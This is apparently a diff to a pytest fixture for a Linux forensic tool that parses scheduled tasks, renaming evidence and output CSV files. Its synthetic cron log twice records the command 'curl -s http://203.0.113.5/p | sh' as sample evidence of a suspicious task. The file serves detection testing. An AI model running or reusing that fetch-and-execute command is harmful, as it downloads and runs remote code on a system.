@@ -62,7 +62,7 @@ def tasks(tmp_path) -> list[dict]:
            "Wed 2026-05-20 03:00:00 CEST 4h left     Tue 2026-05-19 03:00:00 CEST 20h ago      backup.timer            backup-run.service\n"
            "n/a                          n/a         Tue 2026-05-19 09:00:00 CEST 14h ago      ghost.timer             ghost.service\n"
            "\n2 timers listed.\n")
-    _csv(ev, "CSVs/Filesystem/bodyfile.csv",
+    _csv(ev, "CSVs/Filesystem/art_bodyfile.csv",
          ["name", "inode", "mode", "uid", "gid", "size", "atime_utc", "mtime_utc",
           "ctime_utc", "crtime_utc"],
          [["/etc/crontab", "1", "r/rrw-r--r--", "0", "0", "9", "", "2026-01-02 10:00:00", "", ""],
@@ -71,14 +71,14 @@ def tasks(tmp_path) -> list[dict]:
           ["/var/spool/cron/atjobs/a0001501c47b46", "3", "r/rrwx------", "1000", "0", "9",
            "", "2026-05-19 21:00:00", "", ""],
           ["/usr/bin/curl", "4", "r/rrwxr-xr-x", "0", "0", "9", "", "2025-01-01 00:00:00", "", ""]])
-    _csv(ev, "CSVs/EventLogs/cron_log.csv",
+    _csv(ev, "CSVs/EventLogs/art_log_cron.csv",
          ["timestamp", "time_utc", "kind", "user", "detail", "suspicious"],
          [["", "2026-05-19 10:00:00", "exec", "jdoe", "curl -s http://203.0.113.5/p | sh", ""],
           ["", "2026-05-19 10:05:00", "exec", "jdoe", "curl -s http://203.0.113.5/p | sh", ""],
           ["", "2026-05-19 10:05:00", "reload", "jdoe", "crontabs/jdoe", ""]])
     out = tmp_path / "out"
     lin_tasks.run(SimpleNamespace(evidence=ev, out=out, log=logging.getLogger("t")))
-    with open(out / "tasks.csv", encoding="utf-8", newline="") as fh:
+    with open(out / "art_tasks.csv", encoding="utf-8", newline="") as fh:
         return list(csv.DictReader(fh))
 
 
